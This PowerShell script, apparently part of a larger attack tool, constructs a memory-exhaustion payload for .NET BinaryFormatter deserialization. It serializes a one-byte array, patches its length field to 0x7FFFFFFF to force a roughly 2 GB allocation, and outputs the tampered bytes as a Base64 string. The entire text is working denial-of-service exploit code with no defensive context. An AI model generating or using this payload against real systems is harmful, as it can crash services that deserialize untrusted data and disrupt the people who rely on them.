# --- Payload Construction ---
Write-Host "[*] Building Memory Exhaustion payload..." -ForegroundColor Cyan

# 1. Create a tiny 1-byte array
$byteArray = New-Object byte[] 1
$byteArray[0] = 0x41 # 'A'

# 2. Serialize it using BinaryFormatter
$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
$ms = New-Object System.IO.MemoryStream
$formatter.Serialize($ms, $byteArray)
$payload = $ms.ToArray()

# 3. Find and modify the array length
# The serialized format ends with the array data (0x41). 
# The 4 bytes immediately preceding the data are the array length (00 00 00 01).
$dataIndex = $payload.Length - 1
if ($payload[$dataIndex] -eq 0x41) {
    # Overwrite the length with 0x7FFFFFFF (2,147,483,647)
    # This forces the deserializer to try allocating a massive array.
    $payload[$dataIndex - 4] = 0x7F
    $payload[$dataIndex - 3] = 0xFF
    $payload[$dataIndex - 2] = 0xFF
    $payload[$dataIndex - 1] = 0xFF
    Write-Host "[+] Array length successfully modified to 2GB." -ForegroundColor Green
} else {
    Write-Host "[-] Could not locate array data. Payload generation failed." -ForegroundColor Red
    exit
}

# 4. Output the payload as a Base64 string
$base64Payload = [Convert]::ToBase64String($payload)
Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
Write-Host "Base64 Payload: $base64Payload"
